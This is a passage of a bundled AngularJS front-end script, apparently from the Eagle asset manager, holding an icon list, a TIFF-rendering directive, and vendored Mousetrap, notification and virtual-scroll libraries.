                { type: 'icon', icon: 'business-card' },
                { type: 'icon', icon: 'coffee' },
                { type: 'icon', icon: 'cart' },
                { type: 'icon', icon: 'lightbulb' },
                { type: 'icon', icon: 'inspiration' },
                // 评价、符号、钱、时间
                { type: 'icon', icon: 'thumb-up' },
                { type: 'icon', icon: 'thumb-down' },
                { type: 'icon', icon: 'like' },
                { type: 'icon', icon: 'unlike' },
                { type: 'icon', icon: 'star' },
                { type: 'icon', icon: 'hot' },
                { type: 'icon', icon: 'upload' },
                { type: 'icon', icon: 'download' },
                { type: 'icon', icon: 'paid' },
                { type: 'icon', icon: 'free' },
                { type: 'icon', icon: 'medical' },
                { type: 'icon', icon: 'shield' },
                { type: 'icon', icon: 'search' },
                { type: 'icon', icon: 'shortcuts' },
                { type: 'icon', icon: 'recycle' },
                { type: 'icon', icon: 'excalmation' },
                { type: 'icon', icon: 'question' },
                { type: 'icon', icon: 'coin1' },
                { type: 'icon', icon: 'coin2' },
                { type: 'icon', icon: 'coin3' },
                { type: 'icon', icon: 'coin4' },
                { type: 'icon', icon: 'wallet' },
                { type: 'icon', icon: 'watch' },
                { type: 'icon', icon: 'clock' },
                { type: 'icon', icon: 'calendar-week' },
                { type: 'icon', icon: 'calendar-month' },
            ], [
                // 设备、图表、设计类型、字体
                { type: 'icon', icon: 'website' },
                { type: 'icon', icon: 'phone' },
                { type: 'icon', icon: 'tablet' },
                { type: 'icon', icon: 'desktop' },
                { type: 'icon', icon: 'tv' },
                { type: 'icon', icon: 'cpu' },
                { type: 'icon', icon: 'safari' },
                { type: 'icon', icon: 'chrome' },
                { type: 'icon', icon: 'pie' },
                { type: 'icon', icon: 'bar-chart' },
                { type: 'icon', icon: 'line-chart' },
                { type: 'icon', icon: '2d' },
                { type: 'icon', icon: '3d' },
                { type: 'icon', icon: 'contrast' },
                { type: 'icon', icon: 'texture' },
                { type: 'icon', icon: 'transition' },
                { type: 'icon', icon: 'animation' },
                { type: 'icon', icon: 'spectrogram' },
                { type: 'icon', icon: 'font-sans' },
                { type: 'icon', icon: 'font-sans-serif' },
                { type: 'icon', icon: 'font-handwritten' },
                { type: 'icon', icon: 'flag' },
                { type: 'icon', icon: 'earth' },
                { type: 'icon', icon: 'pin' },
                { type: 'icon', icon: 'pin-check' },
                { type: 'icon', icon: 'map' },
                { type: 'icon', icon: 'road' },
                { type: 'icon', icon: 'motor' },
                { type: 'icon', icon: 'rocket' },
                { type: 'icon', icon: 'airplan' },
                { type: 'icon', icon: 'ship' },
                { type: 'icon', icon: 'train' },
                { type: 'icon', icon: 'car' },
                { type: 'icon', icon: 'truck' },
                { type: 'icon', icon: 'water-drop' },
                { type: 'icon', icon: 'sun' },
                { type: 'icon', icon: 'moon' },
                { type: 'icon', icon: 'tree' },
                { type: 'icon', icon: 'mountain' },
                { type: 'icon', icon: 'cloud' },
                // 建筑、家俱、游戏、成就
                { type: 'icon', icon: 'bathtub' },
                { type: 'icon', icon: 'door' },
                { type: 'icon', icon: 'bed' },
                { type: 'icon', icon: 'cabinet' },
                { type: 'icon', icon: 'sofa' },
                { type: 'icon', icon: 'home' },
                { type: 'icon', icon: 'store' },
                { type: 'icon', icon: 'house' },
                { type: 'icon', icon: 'game' },
                { type: 'icon', icon: 'weapon' },
                { type: 'icon', icon: 'armor' },
                { type: 'icon', icon: 'award2' },
                { type: 'icon', icon: 'award' },
                { type: 'icon', icon: 'award3' },
                { type: 'icon', icon: 'crown' },
                { type: 'icon', icon: 'rophy' },
                { type: 'icon', icon: 'gift' },
                { type: 'icon', icon: 'facebook' },
                { type: 'icon', icon: 'twitter' },
                { type: 'icon', icon: 'instagram' },
            ], [
                // 人、動物、神、魔
                { type: 'icon', icon: 'eye' },
                { type: 'icon', icon: 'bear' },
                { type: 'icon', icon: 'dog' },
                { type: 'icon', icon: 'cat' },
                { type: 'icon', icon: 'man' },
                { type: 'icon', icon: 'woman' },
                { type: 'icon', icon: 'group' },
                { type: 'icon', icon: 'smile' },
                { type: 'icon', icon: 'meh' },
                { type: 'icon', icon: 'frown' },
                { type: 'icon', icon: 'die' },
                { type: 'icon', icon: 'baby' },
                { type: 'icon', icon: 'kid' },
                { type: 'icon', icon: 'angel' },
                { type: 'icon', icon: 'demon' },
                { type: 'icon', icon: 'hand' },
                { type: 'icon', icon: 'brain' },

            ], [
                // 数字
                { type: 'icon', icon: 'number0' },
                { type: 'icon', icon: 'number1' },
                { type: 'icon', icon: 'number2' },
                { type: 'icon', icon: 'number3' },
                { type: 'icon', icon: 'number4' },
                { type: 'icon', icon: 'number5' },
                { type: 'icon', icon: 'number6' },
                { type: 'icon', icon: 'number7' },
                { type: 'icon', icon: 'number8' },
                { type: 'icon', icon: 'number9' },
                { type: 'icon', icon: 'number10' },
                { type: 'icon', icon: 'number11' },
                { type: 'icon', icon: 'number12' },
                { type: 'icon', icon: 'number13' },
                { type: 'icon', icon: 'number14' },
                { type: 'icon', icon: 'number15' },
                { type: 'icon', icon: 'number16' },
                { type: 'icon', icon: 'number17' },
                { type: 'icon', icon: 'number18' },
                { type: 'icon', icon: 'number19' },
                { type: 'icon', icon: 'number20' },
            ]];
        }
    }
})
angular.module("tifImg", []).directive('tifImg', function () {
    return {
        restrict: 'A',
        scope: {
            tifImg: "=tifImg"
        },
        link: function (scope, element) {

            let worker;
            const $parent = $(element[0].parentNode);

            scope.$watch("tifImg", loadTif);

            async function loadURLFromWorker(url) {
                return new Promise((resolve, reject) => {

                    if (worker) {
                        worker.terminate();
                        worker = null;
                    }

                    worker = new Worker('js/workers/tifWorker.js');
                    worker.postMessage({ url });

                    worker.onmessage = (e) => {
                        const processedURL = e?.data?.url;
                        if (processedURL !== url && processedURL) {
                            worker.terminate();
                            return;
                        }
                        if (e.data.error) {
                            reject(new Error(e.data.error));
                        } else {
                            resolve(e.data);
                        }
                        worker.terminate();
                    };

                    worker.onerror = () => {
                        reject(new Error('Worker error occurred'));
                        worker.terminate();
                    };
                });
            }

            async function loadTif(newValue, oldValue) {
                if (!newValue) return;

                $("#detail-image").css("opacity", 1);

                const canvas = $parent.find("canvas");
                if (canvas.length > 0) {
                    canvas.remove();
                    element.css({
                        "opacity": 1,
                        "position": "",
                        "z-index": ""
                    });
                }

                const image = scope.tifImg;
                const filePath = FileUrlHelper.getRawUrl(image);
                const { rgba, width, height } = await loadURLFromWorker(filePath);

                if (rgba) {
                    canvas.remove();
                    const cnv = document.createElement("canvas");
                    cnv.width = width;
                    cnv.height = height;
                    const ctx = cnv.getContext("2d");
                    const imgd = ctx.createImageData(width, height);
                    for (let i = 0; i < rgba.length; i++) {
                        imgd.data[i] = rgba[i];
                    }
                    ctx.putImageData(imgd, 0, 0);
                    console.timeEnd("tif");
                    const attr = ["class", "id"];
                    for (let i = 0; i < attr.length; i++) {
                        cnv.setAttribute(attr[i], element[0].getAttribute(attr[i]));
                    }
                    $(cnv).css({
                        'z-index': '10000',
                        position: 'relative'
                    });
                    $parent.append(cnv);
                    element.css({
                        "position": "absolute",
                        "z-index": "9999"
                    });
                    $("#detail-image").css("opacity", 0);
                }
            }
        }
    }
});

/**
 * Mousetrap wrapper for AngularJS
 * @version v0.0.1 - 2013-12-30
 * @link https://github.com/mgonto/mgo-mousetrap
 * @author Martin Gontovnikas <martin@gon.to>
 * @license MIT License, http://www.opensource.org/licenses/MIT
 */
angular.module('mgo-mousetrap', []).directive('wMousetrap', function () {
    return {
        restrict: 'A',
        controller: ['$scope', '$element', '$attrs',
                     function ($scope, $element, $attrs) {
            
            var mousetrap;

            $scope.$watch($attrs.wMousetrap, function(_mousetrap) {
                mousetrap = _mousetrap;

                for (var key in mousetrap) {
                    if (mousetrap.hasOwnProperty(key)) {
                        Mousetrap.unbind(key);
                        Mousetrap.bind(key, applyWrapper(mousetrap[key])); 
                    }
                }
            }, true);
            
            function applyWrapper(func) {
                return throttle(function(e) {
                    func(e);
                    $scope.$evalAsync();
                }, 50);
            }
            
            $element.bind('$destroy', function() {
                if (!mousetrap) return;

                for (var key in mousetrap) {
                    if (mousetrap.hasOwnProperty(key)) {
                        Mousetrap.unbind(key);
                    }
                }
            });

        }]
    }
});

!function(){"use strict";function t(t,n){function e(n,e,i){e!==i&&t.$broadcast("$$rebind::"+n)}Object.keys(n).forEach(function(i){t.$watch(n[i],e.bind(null,i),"object"==typeof t[n[i]])})}function n(t,n){function e(t,e){n.forEach(function(n){t.$on("$$rebind::"+n,e)})}function i(t,n,i,r,o){var c=t.bind(this,n,i,r,o);e(n,c),c()}if(t.$$watchDelegate.wrapped)return t.$$watchDelegate;var r=i.bind(this,t.$$watchDelegate);return r.wrapped=!0,r}function e(t){function e(t,e,i){function r(t,r,o){var c,f,a,u,s;if("string"!=typeof r||!e.test(r))return t.call(this,r,o);for(c=r.split(":"),s=[];c.length;)if(f=c.shift()){if(!i.test(f)){u=[f].concat(c).join(":");break}s.push(f)}return u||(u=s.splice(-1,1)[0]),a=t.call(this,"::"+u,o),a.$$watchDelegate=n(a,s),a}return r.bind(null,t)}e.$inject=["$delegate","bindNotifierRegex","bindNotifierKeyRegex"],t.decorator("$parse",e)}function i(){return{restrict:"A",scope:!0,compile:function(n,e){var i={},r=e.bindNotifier.replace(/[\{\}\s]/g,"").split(",");return r.forEach(function(t){var n=t.split(":");i[n[0]]=n[1]}),function(n){t(n,i)}}}}function r(){return function(n,e){if(!n)throw new Error("No $scope given");if(!e)throw new Error("No notifier object given");t(n,e)}}e.$inject=["$provide"],angular.module("angular.bind.notifier",[]).constant("bindNotifierKeyRegex",/^[a-zA-Z0-9][\w-]*$/).constant("bindNotifierRegex",/^[\s]*:([a-zA-Z0-9][\w-]*):(.+)$/).factory("$Notifier",r).directive("bindNotifier",i).config(e)}();
angular.module("cgNotify",[]).factory("notify",["$timeout","$http","$compile","$templateCache","$rootScope",function(a,b,c,d,e){var f=10,g=15,h=1e4,i="angular-notify.html",j="center",k=document.body,l=0,m=[],n=[],o=function(o){"object"!=typeof o&&(o={message:o}),o.duration=o.duration?o.duration:h,o.templateUrl=o.templateUrl?o.templateUrl:i,o.container=o.container?o.container:k,o.classes=o.classes?o.classes:"";var p=o.scope?o.scope.$new():e.$new();if(p.$position=o.position?o.position:j,p.$message=o.message,p.$classes=o.classes,p.$messageTemplate=o.messageTemplate,l>0)for(var q=n.length+1-l,r=0;q>r;r++)n[r].$close();b.get(o.templateUrl,{cache:d}).then(function(b){var d=c(b.data)(p);if(d.bind("webkitTransitionEnd oTransitionEnd otransitionend transitionend msTransitionEnd",function(a){("opacity"===a.propertyName||0===a.currentTarget.style.opacity||a.originalEvent&&"opacity"===a.originalEvent.propertyName)&&(d.remove(),m.splice(m.indexOf(d),1),n.splice(n.indexOf(p),1),i())}),o.messageTemplate){for(var e,h=0;h<d.children().length;h++)if(angular.element(d.children()[h]).hasClass("cg-notify-message-template")){e=angular.element(d.children()[h]);break}if(!e)throw new Error("cgNotify could not find the .cg-notify-message-template element in "+o.templateUrl+".");e.append(c(o.messageTemplate)(p))}angular.element(o.container).append(d),m.push(d),"center"===p.$position&&a(function(){p.$centerMargin="-"+d[0].offsetWidth/2+"px"}),p.$close=function(){d.css("opacity",0).attr("data-closing","true"),i()};var i=function(){for(var a=0,b=f,c=m.length-1;c>=0;c--){var d=10,e=m[c],h=e[0].offsetHeight,i=b+h+d;e.attr("data-closing")?i+=20:b+=h+g,e.css("top",i+"px").css("margin-top","-"+(h+d)+"px").css("visibility","visible"),a++}};a(function(){i()}),o.duration>0&&a(function(){p.$close()},o.duration)},function(a){throw new Error("Template specified for cgNotify ("+o.templateUrl+") could not be loaded. "+a)});var s={};return s.close=function(){p.$close&&p.$close()},Object.defineProperty(s,"message",{get:function(){return p.$message},set:function(a){p.$message=a}}),n.push(p),s};return o.config=function(a){f=angular.isUndefined(a.startTop)?f:a.startTop,g=angular.isUndefined(a.verticalSpacing)?g:a.verticalSpacing,h=angular.isUndefined(a.duration)?h:a.duration,i=a.templateUrl?a.templateUrl:i,j=angular.isUndefined(a.position)?j:a.position,k=a.container?a.container:k,l=a.maximumOpen?a.maximumOpen:l},o.closeAll=function(){for(var a=m.length-1;a>=0;a--){var b=m[a];b.css("opacity",0)}},o}]),angular.module("cgNotify").run(["$templateCache",function(a){"use strict";a.put("angular-notify.html","<div class=\"cg-notify-message\" ng-class=\"[$classes, \n    $position === 'center' ? 'cg-notify-message-center' : '',\n    $position === 'left' ? 'cg-notify-message-left' : '',\n    $position === 'right' ? 'cg-notify-message-right' : '']\"\n    ng-style=\"{'margin-left': $centerMargin}\">\n\n    <div ng-show=\"!$messageTemplate\">\n        {{$message}}\n    </div>\n\n"+'    <div ng-show="$messageTemplate" class="cg-notify-message-template">\n        \n    </div>\n\n    <button type="button" class="cg-notify-close" ng-click="$close()">\n        <span aria-hidden="true">&times;</span>\n        <span class="cg-notify-sr-only">Close</span>\n    </button>\n\n</div>')}]);
//
// Copyright Kamil Pękala http://github.com/kamilkp
// Angular Virtual Scroll Repeat v1.1.7 2016/03/08
//

(function (window, angular) {
    'use strict';
    /* jshint eqnull:true */
    /* jshint -W038 */

    // DESCRIPTION:
    // vsRepeat directive stands for Virtual Scroll Repeat. It turns a standard ngRepeated set of elements in a scrollable container
    // into a component, where the user thinks he has all the elements rendered and all he needs to do is scroll (without any kind of
    // pagination - which most users loath) and at the same time the browser isn't overloaded by that many elements/angular bindings etc.
    // The directive renders only so many elements that can fit into current container's clientHeight/clientWidth.

    // LIMITATIONS:
    // - current version only supports an Array as a right-hand-side object for ngRepeat
    // - all rendered elements must have the same height/width or the sizes of the elements must be known up front

    // USAGE:
    // In order to use the vsRepeat directive you need to place a vs-repeat attribute on a direct parent of an element with ng-repeat
    // example:
    // <div vs-repeat>
    //      <div ng-repeat="item in someArray">
    //          <!-- content -->
    //      </div>
    // </div>
    //
    // or:
    // <div vs-repeat>
    //      <div ng-repeat-start="item in someArray">
    //          <!-- content -->
    //      </div>
    //      <div>
    //         <!-- something in the middle -->
    //      </div>
    //      <div ng-repeat-end>
    //          <!-- content -->
    //      </div>
    // </div>
    //
    // You can also measure the single element's height/width (including all paddings and margins), and then speficy it as a value
    // of the attribute 'vs-repeat'. This can be used if one wants to override the automatically computed element size.
    // example:
    // <div vs-repeat="50"> <!-- the specified element height is 50px -->
    //      <div ng-repeat="item in someArray">
    //          <!-- content -->
    //      </div>
    // </div>
    //
    // IMPORTANT!
    //
    // - the vsRepeat directive must be applied to a direct parent of an element with ngRepeat
    // - the value of vsRepeat attribute is the single element's height/width measured in pixels. If none provided, the directive
    //      will compute it automatically

    // OPTIONAL PARAMETERS (attributes):
    // vs-repeat-container="selector" - selector for element containing ng-repeat. (defaults to the current element)
    // vs-scroll-parent="selector" - selector to the scrollable container. The directive will look for a closest parent matching
    //                              the given selector (defaults to the current element)
    // vs-horizontal - stack repeated elements horizontally instead of vertically
    // vs-offset-before="value" - top/left offset in pixels (defaults to 0)
    // vs-offset-after="value" - bottom/right offset in pixels (defaults to 0)
    // vs-excess="value" - an integer number representing the number of elements to be rendered outside of the current container's viewport
    //                      (defaults to 2)
    // vs-size - a property name of the items in collection that is a number denoting the element size (in pixels)
    // vs-autoresize - use this attribute without vs-size and without specifying element's size. The automatically computed element style will
    //              readjust upon window resize if the size is dependable on the viewport size
    // vs-scrolled-to-end="callback" - callback will be called when the last item of the list is rendered
    // vs-scrolled-to-end-offset="integer" - set this number to trigger the scrolledToEnd callback n items before the last gets rendered

    // EVENTS:
    // - 'vsRepeatTrigger' - an event the directive listens for to manually trigger reinitialization
    // - 'vsRepeatReinitialized' - an event the directive emits upon reinitialization done

    var dde = document.documentElement,
        matchingFunction = dde.matches ? 'matches' :
            dde.matchesSelector ? 'matchesSelector' :
                dde.webkitMatches ? 'webkitMatches' :
                    dde.webkitMatchesSelector ? 'webkitMatchesSelector' :
                        dde.msMatches ? 'msMatches' :
                            dde.msMatchesSelector ? 'msMatchesSelector' :
                                dde.mozMatches ? 'mozMatches' :
                                    dde.mozMatchesSelector ? 'mozMatchesSelector' : null;

    var closestElement = angular.element.prototype.closest || function (selector) {
        var el = this[0].parentNode;
        while (el !== document.documentElement && el != null && !el[matchingFunction](selector)) {
            el = el.parentNode;
        }

        if (el && el[matchingFunction](selector)) {
            return angular.element(el);
        }
        else {
            return angular.element();
        }
    };

    function getWindowScroll() {
        if ('pageYOffset' in window) {
            return {
                scrollTop: pageYOffset,
                scrollLeft: pageXOffset
            };
        }
        else {
            var sx, sy, d = document, r = d.documentElement, b = d.body;
            sx = r.scrollLeft || b.scrollLeft || 0;
            sy = r.scrollTop || b.scrollTop || 0;
            return {
                scrollTop: sy,
                scrollLeft: sx
            };
        }
    }

    function getClientSize(element, sizeProp) {
        if (element === window) {
            return sizeProp === 'clientWidth' ? window.innerWidth : window.innerHeight;
        }
        else {
            return element[sizeProp];
        }
    }

    function getScrollPos(element, scrollProp) {
        return element === window ? getWindowScroll()[scrollProp] : element[scrollProp];
    }

    function getScrollOffset(vsElement, scrollElement, isHorizontal) {
        var vsPos = vsElement.getBoundingClientRect()[isHorizontal ? 'left' : 'top'];
        var scrollPos = scrollElement === window ? 0 : scrollElement.getBoundingClientRect()[isHorizontal ? 'left' : 'top'];
        var correction = vsPos - scrollPos +
            (scrollElement === window ? getWindowScroll() : scrollElement)[isHorizontal ? 'scrollLeft' : 'scrollTop'];

        return correction;
    }

    var vsRepeatModule = angular.module('vs-repeat', []).directive('vsRepeat', ['$compile', '$parse', function ($compile, $parse) {
        return {
            restrict: 'A',
            scope: true,
            compile: function ($element, $attrs) {
                var repeatContainer = angular.isDefined($attrs.vsRepeatContainer) ? angular.element($element[0].querySelector($attrs.vsRepeatContainer)) : $element,
                    ngRepeatChild = repeatContainer.children().eq(0),
                    ngRepeatExpression,
                    childCloneHtml = ngRepeatChild[0].outerHTML,
                    expressionMatches,
                    lhs,
                    rhs,
                    rhsSuffix,
                    originalNgRepeatAttr,
                    collectionName = '$vs_collection',
                    isNgRepeatStart = false,
                    attributesDictionary = {
                        'vsRepeat': 'elementSize',
                        'vsOffsetBefore': 'offsetBefore',
                        'vsOffsetAfter': 'offsetAfter',
                        'vsScrolledToEndOffset': 'scrolledToEndOffset',
                        'vsExcess': 'excess'
                    };

                if (ngRepeatChild.attr('ng-repeat')) {
                    originalNgRepeatAttr = 'ng-repeat';
                    ngRepeatExpression = ngRepeatChild.attr('ng-repeat');
                }
                else if (ngRepeatChild.attr('data-ng-repeat')) {
                    originalNgRepeatAttr = 'data-ng-repeat';
                    ngRepeatExpression = ngRepeatChild.attr('data-ng-repeat');
                }
                else if (ngRepeatChild.attr('ng-repeat-start')) {
                    isNgRepeatStart = true;
                    originalNgRepeatAttr = 'ng-repeat-start';
                    ngRepeatExpression = ngRepeatChild.attr('ng-repeat-start');
                }
                else if (ngRepeatChild.attr('data-ng-repeat-start')) {
                    isNgRepeatStart = true;
                    originalNgRepeatAttr = 'data-ng-repeat-start';
                    ngRepeatExpression = ngRepeatChild.attr('data-ng-repeat-start');
                }
                else {
                    throw new Error('angular-vs-repeat: no ng-repeat directive on a child element');
                }

                expressionMatches = /^\s*(\S+)\s+in\s+([\S\s]+?)(track\s+by\s+\S+)?$/.exec(ngRepeatExpression);
                lhs = expressionMatches[1];
                rhs = expressionMatches[2];
                rhsSuffix = expressionMatches[3];

                if (isNgRepeatStart) {
                    var index = 0;
                    var repeaterElement = repeatContainer.children().eq(0);
                    while (repeaterElement.attr('ng-repeat-end') == null && repeaterElement.attr('data-ng-repeat-end') == null) {
                        index++;
                        repeaterElement = repeatContainer.children().eq(index);
                        childCloneHtml += repeaterElement[0].outerHTML;
                    }
                }

                repeatContainer.empty();
                return {
                    pre: function ($scope, $element, $attrs) {
                        var repeatContainer = angular.isDefined($attrs.vsRepeatContainer) ? angular.element($element[0].querySelector($attrs.vsRepeatContainer)) : $element,
                            childClone = angular.element(childCloneHtml),
                            childTagName = childClone[0].tagName.toLowerCase(),
                            originalCollection = [],
                            originalLength,
                            $$horizontal = typeof $attrs.vsHorizontal !== 'undefined',
                            $beforeContent = angular.element('<' + childTagName + ' class="vs-repeat-before-content"></' + childTagName + '>'),
                            $afterContent = angular.element('<' + childTagName + ' class="vs-repeat-after-content"></' + childTagName + '>'),
                            autoSize = !$attrs.vsRepeat,
                            sizesPropertyExists = !!$attrs.vsSize || !!$attrs.vsSizeProperty,
                            $scrollParent = $attrs.vsScrollParent ?
                                $attrs.vsScrollParent === 'window' ? angular.element(window) :
                                    closestElement.call(repeatContainer, $attrs.vsScrollParent) : repeatContainer,
                            $$options = 'vsOptions' in $attrs ? $scope.$eval($attrs.vsOptions) : {},
                            clientSize = $$horizontal ? 'clientWidth' : 'clientHeight',
                            offsetSize = $$horizontal ? 'offsetWidth' : 'offsetHeight',
                            scrollPos = $$horizontal ? 'scrollLeft' : 'scrollTop';

                        $scope.totalSize = 0;
                        if (!('vsSize' in $attrs) && 'vsSizeProperty' in $attrs) {
                            console.warn('vs-size-property attribute is deprecated. Please use vs-size attribute which also accepts angular expressions.');
                        }

                        if ($scrollParent.length === 0) {
                            throw 'Specified scroll parent selector did not match any element';
                        }
                        $scope.$scrollParent = $scrollParent;

                        if (sizesPropertyExists) {
                            $scope.sizesCumulative = [];
                        }

                        //initial defaults
                        $scope.elementSize = (+$attrs.vsRepeat) || getClientSize($scrollParent[0], clientSize) || 50;
                        $scope.offsetBefore = 0;
                        $scope.offsetAfter = 0;
                        $scope.excess = (+$attrs.vsExcess) || 20;

                        if ($$horizontal) {
                            $beforeContent.css('height', '100%');
                            $afterContent.css('height', '100%');
                        }
                        else {
                            $beforeContent.css('width', '100%');
                            $afterContent.css('width', '100%');
                        }

                        Object.keys(attributesDictionary).forEach(function (key) {
                            if ($attrs[key]) {
                                $attrs.$observe(key, function (value) {
                                    // '+' serves for getting a number from the string as the attributes are always strings
                                    $scope[attributesDictionary[key]] = +value;
                                    reinitialize();
                                });
                            }
                        });


                        $scope.$watchCollection(rhs, function (coll) {
                            originalCollection = coll || [];
                            refresh();
                        });

                        function refresh() {
                            if (!originalCollection || originalCollection.length < 1) {
                                $scope[collectionName] = [];
                                originalLength = 0;
                                $scope.sizesCumulative = [0];
                            }
                            else {
                                originalLength = originalCollection.length;
                                if (sizesPropertyExists) {
                                    $scope.sizes = originalCollection.map(function (item) {
                                        // var s = $scope.$new(false);
                                        // angular.extend(s, item);
                                        // s[lhs] = item;
                                        // var size = ($attrs.vsSize || $attrs.vsSizeProperty) ?
                                        //     s.$eval($attrs.vsSize || $attrs.vsSizeProperty) :
                                        //     $scope.elementSize;
                                        // s.$destroy();
                                        // debugger
                                        // NOTE: 这段代码调整过，在 Eagle 使用状况下，不需要判断这么多
                                        var size = item.size || $scope.elementSize;
                                        return size;
                                    });
                                    var sum = 0;
                                    $scope.sizesCumulative = $scope.sizes.map(function (size, index) {
                                        var res = sum;
                                        if (size) {
                                            sum += size;
                                        }
                                        return res;
                                    });
                                    $scope.sizesCumulative.push(sum);
                                }
                                else {
                                    setAutoSize();
                                }
                            }

                            reinitialize();
                        }

                        function setAutoSize() {
                            if (autoSize) {
                                $scope.$$postDigest(function () {
                                    if (repeatContainer[0].offsetHeight || repeatContainer[0].offsetWidth) { // element is visible
                                        var children = repeatContainer.children(),
                                            i = 0,
                                            gotSomething = false,
                                            insideStartEndSequence = false;

                                        while (i < children.length) {
                                            if (children[i].attributes[originalNgRepeatAttr] != null || insideStartEndSequence) {
                                                if (!gotSomething) {
                                                    $scope.elementSize = 0;
                                                }

                                                gotSomething = true;
                                                if (children[i][offsetSize]) {
                                                    $scope.elementSize += children[i][offsetSize];
                                                }

                                                if (isNgRepeatStart) {
                                                    if (children[i].attributes['ng-repeat-end'] != null || children[i].attributes['data-ng-repeat-end'] != null) {
                                                        break;
                                                    }
                                                    else {
                                                        insideStartEndSequence = true;
                                                    }
                                                }
                                                else {
                                                    break;
                                                }
                                            }
                                            i++;
                                        }

                                        if (gotSomething) {
                                            reinitialize();
                                            autoSize = false;
                                            if ($scope.$root && !$scope.$root.$$phase) {
                                                $scope.$evalAsync();
                                            }
                                        }
                                    }
                                    else {
                                        var dereg = $scope.$watch(function () {
                                            if (repeatContainer[0].offsetHeight || repeatContainer[0].offsetWidth) {
                                                dereg();
                                                setAutoSize();
                                            }
                                        });
                                    }
                                });
                            }
                        }

                        function getLayoutProp() {
                            var layoutPropPrefix = childTagName === 'tr' ? '' : 'min-';
                            var layoutProp = $$horizontal ? layoutPropPrefix + 'width' : layoutPropPrefix + 'height';
                            return layoutProp;
                        }

                        childClone.eq(0).attr(originalNgRepeatAttr, lhs + ' in ' + collectionName + (rhsSuffix ? ' ' + rhsSuffix : ''));
                        childClone.addClass('vs-repeat-repeated-element');

                        repeatContainer.append($beforeContent);
                        repeatContainer.append(childClone);
                        $compile(childClone)($scope);
                        repeatContainer.append($afterContent);

                        $scope.startIndex = 0;
                        $scope.endIndex = 0;

                        function scrollHandler() {
                            if (updateInnerCollection()) {
                                try {
                                    $scope.$digest();
                                    // $scope.$evalAsync();
                                }
                                catch (err) {
                                    // console.log(err);
                                }
                                // $scope.$evalAsync();
                            }
                        }

                        $scrollParent.on('scroll', throttle(scrollHandler, 33, true));

                        // $scrollParent.on('mousewheel', onMouseWheel);

                        var speedControl = 1.5;
                        if( process.platform == 'darwin' ) {
                            speedControl = 3;
                        }

                        // function onMouseWheel(e) {
                        //     if (!$$horizontal) {
                        //         $scrollParent[0].scrollTop -= (e.wheelDeltaY || (e.originalEvent && (e.originalEvent.wheelDeltaY || e.originalEvent.wheelDelta)) || e.wheelDelta || 0) / speedControl;
                        //         e.stopPropagation();
                        //         e.preventDefault();
                        //         e.returnValue = false;
                        //     }
                        //     else {
                        //         $scrollParent[0].scrollLeft -= (e.wheelDeltaY || (e.originalEvent && (e.originalEvent.wheelDeltaY || e.originalEvent.wheelDelta)) || e.wheelDelta || 0) / 3;
                        //         e.stopPropagation();
                        //         e.preventDefault();
                        //         e.returnValue = false;
                        //     }
                        //     // scrollHandler();
                        // }

                        var onWindowResizeTimeout;
                        function onWindowResize() {
                            clearTimeout(onWindowResizeTimeout);
                            onWindowResizeTimeout = setTimeout(function () {
                                if (typeof $attrs.vsAutoresize !== 'undefined') {
                                    autoSize = true;
                                    setAutoSize();
                                    if ($scope.$root && !$scope.$root.$$phase) {
                                        $scope.$evalAsync();
                                    }
                                }
                                if (updateInnerCollection()) {
                                    $scope.$evalAsync();
                                }
                            }, 200);
                        }

                        angular.element(window).on('resize', onWindowResize);
                        $scope.$on('$destroy', function () {
                            angular.element(window).off('resize', onWindowResize);
                            $scrollParent.off('scroll', scrollHandler);
                            $scrollParent.off('mousewheel');
                        });

                        $scope.$on('vsRepeatTrigger', refresh);

                        $scope.$on('vsRepeatResize', function () {
                            autoSize = true;
                            setAutoSize();
                        });

                        var _prevStartIndex,
                            _prevEndIndex,
                            _minStartIndex,
                            _maxEndIndex;

                        $scope.$on('vsRenderAll', function () {//e , quantum) {
                            if ($$options.latch) {
                                setTimeout(function () {
                                    // var __endIndex = Math.min($scope.endIndex + (quantum || 1), originalLength);
                                    var __endIndex = originalLength;
                                    _maxEndIndex = Math.max(__endIndex, _maxEndIndex);
                                    $scope.endIndex = $$options.latch ? _maxEndIndex : __endIndex;
                                    $scope[collectionName] = originalCollection.slice($scope.startIndex, $scope.endIndex);
                                    _prevEndIndex = $scope.endIndex;

                                    $scope.$$postDigest(function () {
                                        $beforeContent.css(getLayoutProp(), 0);
                                        $afterContent.css(getLayoutProp(), 0);
                                    });

                                    $scope.$apply(function () {
                                        // $scope.$emit('vsRenderAllDone');
                                    });
                                });
                            }
                        });

                        function reinitialize() {
                            _prevStartIndex = void 0;
                            _prevEndIndex = void 0;
                            _minStartIndex = originalLength;
                            _maxEndIndex = 0;
                            updateTotalSize(sizesPropertyExists ?
                                $scope.sizesCumulative[originalLength] :
                                $scope.elementSize * originalLength
                            );
                            updateInnerCollection();

                            // $scope.$emit('vsRepeatReinitialized', $scope.startIndex, $scope.endIndex);
                        }

                        function updateTotalSize(size) {
                            $scope.totalSize = $scope.offsetBefore + size + $scope.offsetAfter;
                        }

                        var _prevClientSize;
                        function reinitOnClientHeightChange() {
                            var ch = getClientSize($scrollParent[0], clientSize);
                            if (ch !== _prevClientSize) {
                                reinitialize();
                                if ($scope.$root && !$scope.$root.$$phase) {
                                    $scope.$evalAsync();
                                }
                            }
                            _prevClientSize = ch;
                        }

                        // $scope.$watch(function () {
                        //     if (typeof window.requestAnimationFrame === 'function') {
                        //         window.requestAnimationFrame(reinitOnClientHeightChange);
                        //     }
                        //     else {
                        //         reinitOnClientHeightChange();
                        //     }
                        // });

                        function updateInnerCollection() {
                            var $scrollPosition = getScrollPos($scrollParent[0], scrollPos);
                            var $clientSize = getClientSize($scrollParent[0], clientSize);

                            var scrollOffset = repeatContainer[0] === $scrollParent[0] ? 0 : getScrollOffset(
                                repeatContainer[0],
                                $scrollParent[0],
                                $$horizontal
                            );

                            var __startIndex = $scope.startIndex;
                            var __endIndex = $scope.endIndex;

                            if (sizesPropertyExists) {
                                __startIndex = 0;
                                while ($scope.sizesCumulative[__startIndex] < $scrollPosition - $scope.offsetBefore - scrollOffset) {
                                    __startIndex++;
                                }
                                if (__startIndex > 0) { __startIndex--; }

                                // Adjust the start index according to the excess
                                __startIndex = Math.max(
                                    Math.floor(__startIndex - $scope.excess / 2),
                                    0
                                );

                                __endIndex = __startIndex;
                                while ($scope.sizesCumulative[__endIndex] < $scrollPosition - $scope.offsetBefore - scrollOffset + $clientSize) {
                                    __endIndex++;
                                }

                                // Adjust the end index according to the excess
                                __endIndex = Math.min(
                                    Math.ceil(__endIndex + $scope.excess / 2),
                                    originalLength
                                );
                            }
                            else {
                                __startIndex = Math.max(
